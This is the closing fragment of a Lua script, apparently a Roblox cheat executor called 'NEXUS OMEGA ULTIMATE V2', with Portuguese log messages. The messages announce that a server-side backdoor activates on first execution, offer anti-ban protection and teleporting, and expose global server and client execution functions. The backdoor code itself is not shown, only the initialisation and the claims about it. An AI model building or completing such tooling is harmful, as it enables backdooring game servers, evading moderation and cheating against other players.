    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus:AddLog("  ★ NEXUS OMEGA ULTIMATE V2 - Modo Profissional ★", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus:AddLog("✅ Interface carregada. Minimize para bolinha arrastável.", "info")
    Nexus:AddLog("✅ Backdoor server-side será ativado na primeira execução.", "info")
    Nexus:AddLog("✅ Proteção anti-ban de voz disponível na aba PROTEÇÃO.", "info")
    Nexus:AddLog("✅ Lista de players atualiza automaticamente. Teleport funcional.", "info")
    Nexus.mainGui = createMainUI()
    if not Nexus.mainGui then
        Nexus:AddLog("❌ Falha ao criar interface", "error")
    end
    getgenv().NexusUltimate = Nexus
    getgenv().executarServer = Nexus.ExecuteServer
    getgenv().executarClient = Nexus.ExecuteClient
    Nexus:AddLog("🎉 Pronto! Use as abas para acessar todas as funções.", "success")
end

pcall(init)
